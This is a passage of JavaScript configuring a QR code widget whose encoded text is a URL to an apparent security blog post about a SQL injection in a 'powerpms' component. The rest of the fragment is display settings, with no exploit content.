text: encodeURI("https://mrxn.net/jswz/powerpms-Control-FileBrowserPdf-sqli-2.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 